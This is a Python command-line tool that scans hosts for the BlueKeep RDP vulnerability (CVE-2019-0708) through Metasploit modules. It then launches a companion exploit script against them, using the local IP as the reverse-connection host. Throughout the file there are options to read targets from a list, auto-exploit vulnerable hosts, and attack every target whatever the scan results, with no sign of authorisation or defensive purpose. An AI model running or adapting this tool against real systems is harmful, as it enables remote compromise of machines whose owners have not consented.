#!/usr/bin/env python3

import sys
import os
import socket
import struct
import argparse
import time
import subprocess
from pathlib import Path

def check_rdp_port(host, port=3389, timeout=3):
    """Check if the target host has the RDP port open."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        
        return result == 0
    except socket.error as e:
        print(f"[-] Error checking target {host}: {e}")
        return False

def detect_windows_version(target_ip, port=3389):
    """
    Detect the Windows version of the target using RDP fingerprinting.
    Returns the appropriate TARGET ID for Metasploit.
    """
    print(f"[*] Attempting to detect Windows version on {target_ip}:{port}...")
    
    # Create resource script for OS detection
    resource_file = "os_detect.rc"
    with open(resource_file, "w") as f:
        f.write("use auxiliary/scanner/rdp/rdp_scanner\n")
        f.write(f"set RHOSTS {target_ip}\n")
        f.write(f"set RPORT {port}\n")
        f.write("run\n")
        f.write("exit\n")
    
    try:
        # Run Metasploit scanner
        cmd = ["msfconsole", "-q", "-r", resource_file]
        process = subprocess.run(
            cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Remove resource file
        if os.path.exists(resource_file):
            os.remove(resource_file)
        
        output = process.stdout.lower()
        
        # Parse the output to identify OS version
        if "windows 7 sp1" in output or "6.1.7601" in output:
            print(f"[+] Detected: Windows 7 SP1 - using TARGET 1")
            return 1
        elif "windows 7" in output or "6.1.7600" in output:
            print(f"[+] Detected: Windows 7 SP0 - using TARGET 2")
            return 2
        elif "windows server 2008 r2 sp1" in output or "windows 2008 r2 sp1" in output:
            print(f"[+] Detected: Windows Server 2008 R2 SP1 - using TARGET 3")
            print(f"[!] Warning: Windows Server 2008 targets require fDisableCam=0 registry setting!")
            return 3
        elif "windows server 2008 r2" in output or "windows 2008 r2" in output:
            print(f"[+] Detected: Windows Server 2008 R2 SP0 - using TARGET 4")
            print(f"[!] Warning: Windows Server 2008 targets require fDisableCam=0 registry setting!")
            return 4
        elif "windows server 2008" in output or "windows 2008" in output:
            print(f"[+] Detected: Windows Server 2008 SP1 - using TARGET 5")
            print(f"[!] Warning: Windows Server 2008 targets require fDisableCam=0 registry setting!")
            return 5
        elif "windows" in output:
            print(f"[?] Windows detected but could not determine specific version")
            print(f"[*] Using default TARGET 2 (Windows 7 SP0)")
            return 2
        else:
            print(f"[?] Could not determine Windows version")
            print(f"[*] Using default TARGET 2 (Windows 7 SP0)")
            return 2
    
    except Exception as e:
        print(f"[-] Error detecting OS version: {e}")
        print(f"[*] Using default TARGET 2 (Windows 7 SP0)")
        return 2

def run_metasploit_scanner(target_ip, port=3389, auto_exploit=False):
    """Run Metasploit scanner to detect BlueKeep vulnerability."""
    print(f"[*] Scanning {target_ip}:{port} for BlueKeep vulnerability...")

    # Create resource script for scanner
    resource_file = "bluekeep_scan.rc"
    with open(resource_file, "w") as f:
        f.write("use auxiliary/scanner/rdp/cve_2019_0708_bluekeep\n")
        f.write(f"set RHOSTS {target_ip}\n")
        f.write(f"set RPORT {port}\n")
        f.write("run\n")
        f.write("exit\n")
    
    try:
        # Run Metasploit with the resource script
        print("[*] Running Metasploit scanner...")
        cmd = ["msfconsole", "-q", "-r", resource_file]
        process = subprocess.run(
            cmd, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Remove resource file
        if os.path.exists(resource_file):
            os.remove(resource_file)
        
        output = process.stdout
        print(output)  # Show the full output
        
        # Check output for vulnerability detection
        if "VULNERABLE" in output:
            print(f"[+] {target_ip}:{port} is VULNERABLE to BlueKeep!")
            should_exploit = auto_exploit or input("Do you want to exploit this target now? (y/n): ").lower() == 'y'
            if should_exploit:
                print(f"[*] Launching exploit against {target_ip}...")
                run_exploit(target_ip, port, None)
            else:
                print("[*] You can exploit this target later with:")
                print(f"    python3 metasploit_bluekeep.py -i {target_ip} -t 2")
            return True
        elif "The target is not exploitable" in output:
            print(f"[-] {target_ip}:{port} is NOT vulnerable to BlueKeep")
            return False
        elif "Auxiliary module execution completed" in output:
            # Module ran but couldn't determine vulnerability status
            print(f"[?] Scan completed but vulnerability status is uncertain for {target_ip}:{port}")
            should_exploit = auto_exploit or input("Try to exploit this target anyway? (y/n): ").lower() == 'y'
            if should_exploit:
                print(f"[*] Attempting to exploit {target_ip} anyway...")
                run_exploit(target_ip, port)
            return None
        else:
            print(f"[?] Could not determine if {target_ip}:{port} is vulnerable")
            should_exploit = auto_exploit or input("Try to exploit this target anyway? (y/n): ").lower() == 'y'
            if should_exploit:
                print(f"[*] Attempting to exploit {target_ip} anyway...")
                run_exploit(target_ip, port)
            return None
    
    except FileNotFoundError:
        print("[-] Error: Metasploit Framework (msfconsole) not found")
        print("[*] Please install Metasploit Framework first")
        return None
    except Exception as e:
        print(f"[-] Error running scanner: {e}")
        return None

def run_exploit(target_ip, port=3389, target_id=None):
    """Run the BlueKeep exploit against the target."""
    print(f"[*] Executing exploit against {target_ip}:{port}")
    
    try:
        # Auto-detect local IP
        s = subprocess.run(['hostname', '-I'], stdout=subprocess.PIPE, text=True)
        lhost = s.stdout.strip().split()[0]
        print(f"[*] Using local IP: {lhost} for reverse connection")
        
        # If no target_id provided, detect OS
        if target_id is None:
            target_id = detect_windows_version(target_ip, port)
        
        # Run the exploit
        cmd = ["python3", "metasploit_bluekeep.py", "-i", target_ip, "-l", lhost, 
               "-t", str(target_id), "-p", str(port), "-f"]
        subprocess.run(cmd)
    except Exception as e:
        print(f"[-] Error running exploit: {e}")
        print("[*] You can manually exploit this target with:")
        print(f"    python3 metasploit_bluekeep.py -i {target_ip} -t 2")

def scan_from_file(filename, port=3389, auto_exploit=False):
    """Scan multiple IPs from a file."""
    print(f"[*] Loading targets from {filename}")
    try:
        with open(filename, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        print(f"[*] Loaded {len(targets)} targets")
        vulnerable_targets = []
        
        for target in targets:
            print(f"\n[*] Checking {target}...")
            if check_rdp_port(target, port):
                print(f"[+] RDP port open on {target}:{port}")
                result = run_metasploit_scanner(target, port, auto_exploit)
                if result:
                    vulnerable_targets.append(target)
            else:
                print(f"[-] No RDP service detected on {target}:{port}")
        
        if vulnerable_targets:
            print(f"\n[+] Found {len(vulnerable_targets)} vulnerable targets:")
            for target in vulnerable_targets:
                print(f"    - {target}")
            
            # Save vulnerable targets to file
            with open("vulnerable_targets.txt", "w") as f:
                for target in vulnerable_targets:
                    f.write(f"{target}\n")
            print("[+] Vulnerable targets saved to 'vulnerable_targets.txt'")
        else:
            print("\n[-] No vulnerable targets found")
    
    except FileNotFoundError:
        print(f"[-] File not found: {filename}")
    except Exception as e:
        print(f"[-] Error processing file: {e}")

def main():
    banner = """
    ____  __           __ __                _____                                  
   / __ )/ /_  _____  / //_/__  ___ ____   / ___/________ _____  ____  ___  ____  
  / __  / / / / / _ \/ ,< / _ \/ -_) __/   \__ \/ ___/ __ `/ __ \/ __ \/ _ \/ __ \ 
 / /_/ / /___/ /  __/ /| /  __/\__/_/     ___/ / /__/ /_/ / / / / / / /  __/ / / /
/_____/_____/_/\___/_/ |_\___/           /____/\___/\__,_/_/ /_/_/ /_/\___/_/ /_/ 
                                                                                  
 CVE-2019-0708 BlueKeep Vulnerability Scanner
 """
    
    print(banner)
    
    parser = argparse.ArgumentParser(description="BlueKeep Vulnerability Scanner")
    
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("-i", "--ip", help="Target IP address")
    target_group.add_argument("-f", "--file", help="File containing target IP addresses, one per line")
    
    parser.add_argument("-p", "--port", type=int, default=3389, help="Target port (default: 3389)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-a", "--auto-exploit", action="store_true", help="Automatically exploit vulnerable targets")
    parser.add_argument("-x", "--exploit-all", action="store_true", help="Try to exploit all targets regardless of scan results")
    
    args = parser.parse_args()
    
    try:
        if args.ip:
            # Scan single IP
            if check_rdp_port(args.ip, args.port):
                print(f"[+] RDP port open on {args.ip}:{args.port}")
                run_metasploit_scanner(args.ip, args.port, args.auto_exploit or args.exploit_all)
            else:
                print(f"[-] No RDP service detected on {args.ip}:{args.port}")
                if args.exploit_all:
                    print("[*] Exploit-all flag set, attempting exploit anyway...")
                    run_exploit(args.ip, args.port)
        else:
            # Scan multiple IPs from file
            scan_from_file(args.file, args.port, args.auto_exploit or args.exploit_all)
            
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] An unexpected error occurred: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
